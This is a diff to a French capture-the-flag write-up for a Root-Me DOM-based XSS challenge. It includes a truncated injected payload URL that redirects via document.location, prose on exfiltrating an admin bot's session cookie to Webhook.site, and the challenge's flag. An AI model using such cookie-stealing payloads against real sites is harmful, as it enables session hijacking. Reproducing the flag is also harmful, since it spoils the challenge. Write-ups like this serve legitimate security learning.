@@ -276,3 +276,5 @@ http://challenge01.root-me.org/web-client/ch32/?number=42';document.location='ht
 - **Récupérer le flag :** Le robot (simulant l'administrateur) va cliquer sur le lien. Son navigateur va interpréter le JavaScript modifié et envoyer automatiquement son cookie de session vers le serveur `Webhook.site`. Il ne reste plus qu'à consulter les logs du Webhook pour récupérer le "flag" et valider le challenge.
 
 ![flag](/images/2026-03-16-19-03-52.png)
+
+🏁 `c=flag=rootme{XSS_D0M_BaSed_InTr0}`
